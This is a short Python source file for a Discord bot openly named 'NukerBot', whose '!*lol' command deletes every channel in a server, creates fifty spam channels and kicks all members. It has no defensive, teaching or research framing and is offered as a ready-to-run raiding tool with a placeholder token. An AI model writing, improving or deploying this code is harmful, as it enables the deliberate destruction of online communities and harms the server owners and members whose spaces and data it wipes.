import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import logging

client = commands.Bot(command_prefix='!*')

client.remove_command("help")

bot = ""

spamChannel = "NukerBotPowerful"

@client.event
async def on_ready():
    bot = '{0.user}'.format(client)
    print('[Online] We have logged in as: '+bot)

@client.command()
async def lol(ctx):
    server = ctx.guild
    await ctx.send(f'NukerBot Will Now Cause Havoc')

    for channel in server.channels:
        await channel.delete()

    for x in range(50):
        await server.create_text_channel(spamChannel)

    for member in server.members:
        await server.kick(member, reason=None)
    
client.run("URTOKENHERE") #Bot's Token Code Goes Here
